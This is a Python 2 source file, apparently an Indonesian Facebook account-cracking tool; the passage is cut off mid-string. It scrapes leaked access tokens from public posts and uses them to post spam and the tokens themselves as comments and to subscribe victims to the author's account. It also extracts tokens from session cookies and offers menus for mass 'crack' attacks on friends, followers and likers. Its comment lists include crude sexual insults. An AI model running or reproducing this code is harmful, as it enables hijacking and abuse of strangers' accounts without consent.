#coding=utf-8
#python2 

import requests,bs4,sys,os,random,time,re,json
import calendar,proff
from datetime import datetime
from datetime import date 
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding("utf-8")
if 'linux' in sys.platform.lower():
    p = "\033[1;37m"
    k = "\033[1;33m"
    b = "\033[1;36m"
    m = "\033[1;91m"
    h = "\033[1;32m"
    d = "\033[1;34m"
    a = "\033[1;34m"
else:
    p = ""
    k = ""
    b = ""
    m = ""
    h = ""
    d = ""
    a = ""

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

def bersih():
	os.system("clear")

def run(x):
    pt = '\x1b[1;37m'
    rd = '\x1b[1;37m\x1b[1;31m'
    rg = '\x1b[6;32m'
    try:
        num = 0
        while num < 1:
            for i, char in enumerate(x):
                if i == 0:
                    print '\r%s%s%s%s' % (rg, char.lower(), rd, x[1:]),
                    sys.stdout.flush()
                else:
                    if i == 1:
                        okklah = x[0].lower()
                        print '\r%s%s%s%s%s%s' % (rd, okklah, pt, char.lower(), rg, x[2:]),
                        sys.stdout.flush()
                    elif i == i:
                        okklah = x[0:i].lower()
                        print '\r%s%s%s%s%s%s' % (rd, okklah, pt, char.lower(), rg, x[i + 1:]),
                        sys.stdout.flush()
                    time.sleep(0.07)

            num += 1

    except:
        exit()

# Mengetik Otomatis
def mengetik(z):
    for e in z + "\n":
	sys.stdout.write(e)
  	sys.stdout.flush()
	time.sleep(0.10)

#memgetik cepat
def speed(z):
    for e in z + "\n":
 	sys.stdout.write(e)
 	sys.stdout.flush()
 	time.sleep(0.001)

#def run
def run_indo():
        m = ["|","/","-","\\"]
        for b in range(2):
                for t in m:
                        sys.stdout.write("  \r\033[37m [\033[33m!\033[37m] \033[36mConnecting Server \033[32m"+t)
                        sys.stdout.flush()
                        time.sleep(1)

#ngentuod
def sangar():
        m = ["|","/","-","\\"]
        for b in range(2):
                for t in m:
                        sys.stdout.write("  \r\033[37m [\033[33m!\033[37m] \033[36mRemoving Token \033[32m"+t)
                        os.system("rm -rf login.txt")
                        run(" Removing token loading...")
                        sys.stdout.flush()
                        time.sleep(1)        

#thankz to risky                              
def auto_token():
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			print(" \033[1;37m[\033[1;33m•\033[1;37m] Token : "+str(ba))
			post1 = ('1230470587425293') 
			post1 = ("1230470587425293") 
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen1 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen5 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen3 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen4 + '&access_token=' + token)			
			requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token) 
			cek_token(naa)
			
	llink_token = requests.get("https://free.facebook.com/story.php?story_fbid=172628718203472&id=100063690353340&_rdr")
	ttoken_free = re.findall("EAA\w+", llink_token.text)
	for nnaa in ttoken_free:
		ba += 1
		if len(nnaa)>=37:
			token = nnaa
			print(" \033[1;37m[\033[1;33m•\033[1;37m] Token : "+str(ba))
			post1 = ('1230470587425293') 
			post1 = ("1230470587425293") 
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen1 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen5 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen3 + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen4 + '&access_token=' + token)			
			requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token) ### FB RISKY
			cek_token(nnaa)
	                              
def cek_token(token):
	try:
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(p+' ['+k+'•'+p+'] Name Facebook : '+nama[0:10])
		print(' \033[1;37m[\033[1;33m•\033[1;37m] ID Facebook   : '+id)
	except:pass
	try:
		goblok = []
		for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				kirek = i["id"]
				goblok.append(kirek)
			except:pass
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	if _id == "0" or "0" == _id:
		jalan(" \033[1;37m[\033[1;31m!\033[1;37m] No Friends !")
	else:
		print(" \033[1;37m[\033[1;33m•\033[1;37m] Teman : "+h+_id+k)
		tok = open("tokenfree.txt", "w")
		tok.write(token)
		tok = open("login.txt", "w")
		tok.write(token)
		tok.close()
		jalan(p+ " ["+k+"•"+p+"]"+k+" Token Free Connected "+h+"✓"+p)
		jalan(p+ " ["+k+"✓"+p+"]"+k+" Token Free Save to: tokenfree.txt"+p)
		run_indo()
		print("\n %s[%s•%s] Login Succesfully"%(p,k,p));jalan(" %s[%s•%s] Please Subscribe My Channel:)"%(p,k,p));os.system('xdg-open %s'%(youtuber));exit(killer())
	print ("\n\n")                                        
                        
panah = "\033[1;91m➤\033[1;33m➤\033[1;32m➤\033[1;36m➤\x1b[0m"		

panah2 = "\033[4;33mChoose\x1b[0m\n \033[1;91m➤\033[1;33m➤\033[1;32m➤\033[1;36m➤\x1b[0m"

fb = 'https://m.facebook.com'

loop = 0
ttl = []
id = []
ok = []
cp = []
#ua = []

ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

banner = ("""
 
 \033[0;33m██╗      \033[0;32m██████╗  \033[0;31m██████╗ \033[0;36m██╗\033[0;35m███╗   ██╗
 \033[0;33m██║     \033[0;32m██╔═══██╗\033[0;31m██╔════╝ \033[0;36m██║\033[0;35m████╗  ██║
 \033[0;33m██║     \033[0;32m██║   ██║\033[0;31m██║  ███╗\033[0;36m██║\033[0;35m██╔██╗ ██║
 \033[0;33m██║     \033[0;32m██║   ██║\033[0;31m██║   ██║\033[0;36m██║\033[0;35m██║╚██╗██║
 \033[0;33m███████╗\033[0;32m╚██████╔╝\033[0;31m╚██████╔╝\033[0;36m██║\033[0;35m██║ ╚████║
 \033[0;33m╚══════╝ \033[0;32m╚═════╝  \033[0;31m╚═════╝ \033[0;36m╚═╝\033[0;35m╚═╝  \033[0;35m╚═══╝
    \033[44m\033[1;37m MassAll Version  \033[41m\033[1;37m Profesor Acc \x1b[0m""")
        
logo = """

 \033[0;33m███╗   ███╗ \033[0;32m█████╗ \033[0;31m███████╗\033[0;36m███████╗
 \033[0;33m████╗ ████║\033[0;32m██╔══██╗\033[0;31m██╔════╝\033[0;36m██╔════╝
 \033[0;33m██╔████╔██║\033[0;32m███████║\033[0;31m███████╗\033[0;36m███████╗
 \033[0;33m██║╚██╔╝██║\033[0;32m██╔══██║\033[0;31m╚════██║\033[0;36m╚════██║
 \033[0;33m██║ ╚═╝ ██║\033[0;32m██║  ██║\033[0;31m███████║\033[0;36m███████║
 \033[0;33m╚═╝     ╚═╝\033[0;32m╚═╝  ╚═╝\033[0;31m╚══════╝\033[0;36m╚══════╝
  \033[44m\033[1;37m MassAll Version  \033[41m\033[1;37m Profesor Acc \x1b[0m\n"""

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")


subrek = random.choice(["https://youtube.com/channel/UC1ed4h-ZksGPWB13-ctZQCg"])

youtuber = subrek

#user agentod
ua1 = 'Mozilla/5.0 (Linux; Android 9; moto e6s Build/POES29.288-60-6-1-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/317.0.0.51.119;]'
ua2 = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua3 = 'Mozilla/5.0 (Linux; Android 10; moto g 5G Build/QZKS30.Q4-40-81-3-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua4 = 'Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua5 = 'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/268.0.0.5.116;]'
ua6 = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua7 = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua8 = 'Mozilla/5.0 (Linux; Android 10; moto g(8) plus Build/QPIS30.28-Q3-28-26-4-1-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/286.0.0.48.112;]'
ua9 = 'Mozilla/5.0 (Linux; Android 11; motorola one hyper Build/RPFS31.Q1-21-20-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua10 = 'Mozilla/5.0 (Linux; Android 9; LM-K410 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'
ua11 = 'Mozilla/5.0 (Linux; Android 7.0; ASUS_X018D Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua12 = 'Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua13 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
ua14 = 'Mozilla/5.0 (Linux; Android 10; N20Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua15 = 'Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua16 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua17 = 'Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/280.0.0.9.119;]'
ua18 = 'Mozilla/5.0 (Linux; Android 10; CLT-L09 Build/HUAWEICLT-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/279.0.0.10.118;]'
ua19 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]'
ua20 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua_de = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17,ua18,ua19,ua20])

#######################################################

def login():
    global token
    os.system("clear");print(banner)
    print("\033[1;93m ═══════════════════════════════════════\n")
    print(" %s[%s1%s] Login with token %s(%srecomended%s)\n%s [%s2%s] Login with cookie %s(Di NonActivkan)\n%s [%s3%s] Access Token\n%s [%s4%s] Login with Game\n%s [%s5%s] Login Manual\n%s [%s6%s] Free Token %s(%sunlimited%s)"%(p,k,p,h,p,h,p,k,p,m,p,k,p,p,k,p,p,k,p,p,k,p,h,p,h))
    pil_log=raw_input("\n \033[4;33mChoose%s:\x1b[0m\n %s➤%s➤%s➤%s➤ %s"%(p,m,k,h,b,p))
    if pil_log in ["1","01"]:
        log_token()
    elif pil_log in ["2","02"]:
        cookie()
    if pil_log in ["3","03"]:
        tuoken()  
    if pil_log in ["4","04"]:
        __seting_login_fb_game__()   
    if pil_log in ["5","05"]:
        login_dengan_passwod() 
    elif pil_log in ["6","06"]:
        auto_token()          
    else:print("\n%s [%s!%s] Unknown!"%(p,m,p));time.sleep(2);login()
    

def tuoken():
    jalan('\n%s •%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(b,p));time.sleep(2)
    jalan('%s •%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(b,p,h));time.sleep(2)
    jalan('%s •%s copy link %s[ %sview-source:https://business.facebook.com/business_locations%s ]%s dan pastekan di chrome'%(b,p,m,b,m,p));time.sleep(2)
    jalan('%s •%s setelah di alihkan ke google chrome. klik %stitik tiga'%(b,p,h));time.sleep(2)
    jalan('%s •%s lalu klik %sCari di Halaman/Finder Page%s Tinggal ketik %sEAAG%s Lalu salin.\n'%(b,p,h,p,h,p));time.sleep(2)
    raw_input(' \033[1;37m[\033[1;33mENTER\033[1;37m]')
    login()

def log_token():
    global token
    os.system("clear");print(banner)
    print("\033[1;93m ═══════════════════════════════════════\n")
    convert=raw_input("%s [%s•%s] Token: %s"%(p,k,p,h))
    try:
        saya=requests.get('https://graph.facebook.com/me?access_token=%s'%(convert));open("login.txt",'w').write(convert)
        run_indo()
        print("\n %s[%s•%s] Login Succesfully"%(p,k,p));jalan(" %s[%s•%s] Please Subscribe My Channel:)"%(p,k,p));os.system('xdg-open %s'%(youtuber));exit(killer())
    except KeyError:
        print("\n %s[%s!%s] Token invalid!"%(p,m,p));time.sleep(1);login()

def update():
    print("\n %s[%s!%s] Mode NonActive!"%(p,m,p));time.sleep(2);login()

def cookie():
	update()
	os.system('clear');print(logo)
	print("\033[1;93m ═════════════════════════════════════════")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ")
	try:
		data = requests.get('https://business.facebook.com/business_locations', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36', # Don't ulek-ulek ea Njink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print("\n %s[%s•%s] Login berhasil"%(p,k,p));jalan(" %s[%s•%s] Please Subscribe My Channel:)"%(p,k,p));os.system('xdg-open %s'%(youtuber));exit(killer())
def menu():
    try:
        token = open("login.txt","r").read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s'%(token))
        i = json.loads(saya.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split("/")
        month = bulan_ttl[month]
    except Exception as e:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    os.system("clear");print(logo)
    IP = requests.get('https://api.ipify.org').text
    print("\033[1;93m ═════════════════════════════════════════")
    print("%s [%s•%s] Nickname      : %s "%(p,k,p,nick));print("%s [%s•%s] ID facebook   : %s "%(p,k,p,idme));print("%s [%s•%s] IP Device     : %s "%(p,k,p,IP));print("%s [%s•%s] DOB           : %s %s %s"%(p,k,p,day,month,year));print("%s [%s•%s] Date Time     : %s "%(p,k,p,tgl))
    print("\033[1;93m ═════════════════════════════════════════")
    print("%s [%s01%s] Crack with %smassall "%(p,k,p,h))
    print("%s [%s02%s] Crack with my friends "%(p,k,p))
    print("%s [%s03%s] Crack with friends public "%(p,k,p))
    print("%s [%s04%s] Crack with followers public"%(p,k,p))
    print("%s [%s05%s] Crack with like public"%(p,k,p))
    print("%s [%s06%s] Chek opsional account sesi"%(p,k,p))
    print("%s [%s07%s] Setting user agent"%(p,k,p))
    print("%s [%s08%s] Chek result crack"%(p,k,p))
    print("%s [%s09%s] %sRefresh"%(p,k,p,h))
    print("%s [%s10%s] Tools etc."%(p,k,p)) 
    print("%s [%s11%s] %sAttention!"%(p,k,p,m)) 
    print("%s [%s12%s] %sSetting APN Crack"%(p,k,p,p)) 
    print("%s [%s00%s] Logout"%(p,k,p))
    pill = raw_input("\n \033[4;33mChoose%s:\x1b[0m\n %s➤%s➤%s➤%s➤ %s"%(p,m,k,h,b,p))
    if pill in ["1","01"]:
        massal()
        cruot()
    elif pill in ["2","02"]:
        teman()
        cruot()
    elif pill in ["3","03"]:
        publik()
        cruot()
    elif pill in ["4","04"]:
        followers()
        cruot()
    elif pill in ["5","05"]:
        likes()
        cruot()
    elif pill in ["6","06"]:
        #option_sesi()
        cek_opsi_sesi()
    elif pill in ["7","07"]:
        setting()
    elif pill in ["8","08"]:
        results()
    elif pill in ["12"]:
        mengetik("\n \033[1;93mTips & Trick\n\n \033[1;37mJika pada saat crack selalu tidak ada hasil, anda bisa mengatur apn terlebih dahulu ")
        raw_input("\n\n \033[1;37m[\033[1;33m ENTER \033[1;37m]")
        tips()           
    elif pill in ["0","00"]:
        sangar()        
    elif pill in("11"): 
        mengetik("\n \033[1;91mPeringatan!\n\n \033[1;37mKami sedang menguji apakah tools ini bekerja dengan baik\n atau masih ada Bug-Nya,\n Dan kami ingin membuktikan kepada pengguna source code ini\n agar mereka percaya dan melihat\n dengan mata kepalanya sendiri.")
        raw_input("\n\n \033[1;37m[\033[1;33mTekan ENTER untuk membuktikan\033[1;37m]")
        os.system("xdg-open http://upload.bloggingheads.tv/upload/files/bukti_01.html");time.sleep(3);menu()
    elif pill in ["9","09"]:
        menu()   
    elif pill in("10"):
        time.sleep(1.5)
        goblak()
    else:print("\n%s [%s!%s] Unknown!"%(p,m,p));time.sleep(1);menu()
    
#beda jalur
import requests, sys, os, random, proff
from requests.exceptions import ConnectionError
komen1 = random.choice(['Bang Lu Ngntd!', 'Bang aku mau cerita nih bang Kemarin kan ada cewek ya bang yang minta sv terus aku jadian bang sama dia Udah 3 tahun berpacaran lewat wa bang Lha terus aku baru tau kalo dia itu berbatang :( asyuuu og :( ', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Bang sebenernya lu cakep bang tapi sayang kayak pejuh :v', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'buah mangga buah durian i love u bang :v', 'Hiiih abang jomblo ya? kasian bet dah :v', 'Wih Panutan Gua Nih', 'Bang prof kentod:v', 'Makan sayur di terminal Abang kayak marjinal:v'])
komen2 = random.choice(['Bang lu cakep tapi sayang kayak pejuh:v', 'Mantap Bang', 'bang lu kgk punya pacar?', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Hii abang gak punya pacar :v', 'Abang kemarin yang ngentod dipinggir jalan itu kan? ', 'Semoga Abang Jadi Orang Sukses', 'Bjir Ganteng Kali Kau Bang'])
komen3 = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'Wih Panutan Gua Nih'])
komen4 = random.choice(['Kamu sangat populer di kepalaku. Bahkan saat aku tidur, kepalaku tetap disibukkan olehmu. Karena kamu selalu singgah dalam mimpiku.', 'Jika nanti cinta dan rindu tak terdengar di telingamu lagi, percayalah doaku akan setia memeluk jiwamu hingga malam yang menyendiri.', 'Jika ini memang cinta, aku hanya tahu bagaimana cara mengungkapkannya dalam ketelanjangan apa adanya. Dengan segenap raga, hati, dan jiwaku yang mengulum kepasrahan tanpa syarat.', 'Jika bertemu denganmu adalah takdir Tuhan, dan berteman denganmu adalah pilihan, maka jatuh cinta padamu bukanlah sesuatu yang aku rencanakan.', 'aku lebih terfokus dengan 2 gunung kembar itu yg nampak menjulang tinggi dan kokoh itu, aku kasihan dengan tubuhmu yg nampak keberatan menopang 2 gunung kembarmu itu, ingin sekali aku membantu mengangkatnya agar kau tak keberatan lagi, tapi kebaikan itu pasti dianggap yg tidak tidak, tapi aku ttp sabar menunggu jika kau perlu bantuan ku', 'Pandanganku tertuju pada sebuah bentuk Odading yg empuk,ingin rasanya ku memegang dan meremas bulatan odading itu, tapi apa daya itu sangat mustahil dilakukan, untuk saat ini aku hanya bisa mencekik peliharaan ku bernama asep bersama sabun lagi..', 'sebuah puisi telahku persembahkan kepadamu,telahku tunjukkan untukmu demi harapan yang tak kunjung padam,para ksatria malam ini tak pernah lelah,tak pernah letih untuk menuliskan seribu puisi hanya demi melihat pemandangan surga,pemandangan gunung kembar yang menjulang tinggi dan kokoh, entah kenapa setiap memandangmu seperti mimpi seakan akan melihat sang bidadari,dibawah sana terdapat semak belukar bak rintangan yang menghadang demi menuju ke terowongan suci nan hangat,aku tak ingin berkolabirasi dengan lifeboy lagi:)', 'Hitamnya kacamata manisnya senyuman dan 2 gunung kembar sangat indah ciptaan tuhan walau 2 gunung tidak tampak karna tertutupi oleh kain warna warni yang sangat menyilaukan mata tetapi adik kecilku ini tetap terbangun tertegak bagaikan tiang yang tinggi seakan" menjerit ingin mendakinya maaf adikku kali ini waktunya kamu mengeluarkan sesuatu', 'Sungguh elok rupa mu sungguh indah lekuk tubuh mu di balik gunung kembar nan indah yg di balut kain bercorak itu ada sebuah pemandangan yg begitu menakjubkan tidak semua orang bisa singgah di sana kemudian bagian bawah mu bagaikan Rawa tanpa dasar yg begitu banyak rahasia yg belum terungkap , tepi semua itu hanyalah Angan dan pikiran kotor yg ku rasa Takan pernah terwujud walaw sekeras apapun aqu mencoba ...... Maafkan aqu Prakoso Mungkin malam ini Aqu hanya bisa Menipu mu dgn Halusinasi di susul Combo Cekikan ...', 'Didalam kamar yang sunyi ini aku diselimuti rasa kedinginan bersama iringan suara rintik air hujan pada akhir tahun ini,Dan aku melihat sebuah foto yang sungguh mengagumkan, foto yang menggambarkan sebuah pemandangan gunung kembar yang harus dinikmati, namun sayang sekali pemandangan gunung yang mempesona itu tertutupi oleh sebuah kain berwarna hitam,Ibarat menikmati indahnya gunung yang tertutupi kabut tebal,Dan semuanya terasa sia-sia kali ini, sang joni merasa kecewa akan hal ini dan tak sanggup menahan amarah di ruang sunyi ini, terpaksa diruangan ini joni harus kucekik lagi.'])
komen5 = random.choice(['Mendung tanpo udan, Ketemu lan kelangan, Kabeh kui sing diarani perjalanan, Awak dewe tau duwe bayangan, Besok yen wes wayah omah-omahan, Aku moco koran sarungan, Kowe belonjo dasteran, Nanging saiki wes dadi kenangan, Aku karo koe wes pisahan, Aku kiri kowe kanan, wes bedo dalan, Mlaku bebarengan, Ben dino sayang-sayangan, Sedih lan kebahagiaan, Dilewati tahun-tahunan, Padu meneng-menengan, Bar kui kangen-kangenan, Kadang bedo pilihan, Nganti pedot balikan, Mendung tanpo udan, Ketemu lan kelangan, Kabeh kui sing diarani perjalanan, Awak dewe tau duwe bayangan, Besok yen wes wayah omah-omahan, Aku moco koran sarungan, Kowe belonjo dasteran, Nanging saiki wes dadi kenangan, Aku karo koe wes pisahan, Aku kiri kowe kanan, wes bedo dalan, Mendung tanpo udan, Ketemu lan kelangan, Kabeh kui sing diarani perjalanan, Awak dewe tau duwe bayangan, Besok yen wes wayah omah-omahan, Aku moco koran sarungan, Kowe belonjo dasteran, Nanging saiki wes dadi kenangan, Aku karo koe wes pisahan, Aku kiri kowe kanan, wes bedo dalan', 'piye sek jelaske karo wongtuwo, wes ngelakoni tekan semene, nek akhire bakal bubar pisahan, kowe kegudo tresno karo wong liyo, ngelali kowe sing tau ngomong dewe, ngelakoni tresno tekan tuwo, ora ngeliyo mung aku ning atimu, nanging saiki atimu ono wong liyo, ibarat esuk mendung, awan aku kudanan, sore mbok larani, bengi tak tangisi, mung iso bayangke kabeh kenangan, kowe tak boncengke, turut dalan kekepan kudanan, saiki nyatane kowe malah milih, dikekep wong liyo, opo kowe ra kroso abote atiku, kudu kelangan wong sing paling tak tresnani, ra jenak dolan, ra doyan mangan, nek ra mbok dulang.', 'Pada saat moment kebersamaan kita, kita pesen satu es. Pas saya lagi sendok itu es kemulut, cuuut itu ngilu nya. Saya bener bener langsung keilangan moment kebersamaan sama sahabat sahabat saya. Dokter sarankan (coba deh ibu pakai sensodyne khusus untuk gigi yang sensitif). Berkat sensodyne, sekarang waah saya malah mungkin paling banyak tu kata temen temen (eh rin pelan pelan dong makan nya kita belum kebagian nih). Mas es nya yang banyak ya. Dug dug', 'Pah permennya?, Mentang-mentang cari duit, beliin anak sembarangan!, Baru pulang dimarahin, ngajak berantem?, Kamu sih!, Hieehhh! Eh jangan berantem dulu!, Kiki cuman minta permen susu, Milk Milk susu asli Milkita, Ini permen susu mahal, 3 loli milkita, setara dengan 120 kalori, Bikin sehat, cerdas dan ceria', 'Ini anak kami, Ada juga yang dikebun, namanya malika, Malika itu, kedelai hitam dari bango, Yang saya besarkan sepenuh hati, seperti anak sendiri, Hasilnya, kedelai hitam pilihan, Untuk membuat kecap bango, yang hitam dan kental, Rasa masakan, jadi benar benar lezat, Karena rasa, tak pernah bohong, Bango, benar benar kecap', 'Wadimor sarung khas Indonesia, Wadimor beragam coraknya, Wadimor sarung istimewa, Terasa lebih sempurna, Wadimor sarung khas Indonesia, Wadimor tentu sarung kita', 'Air 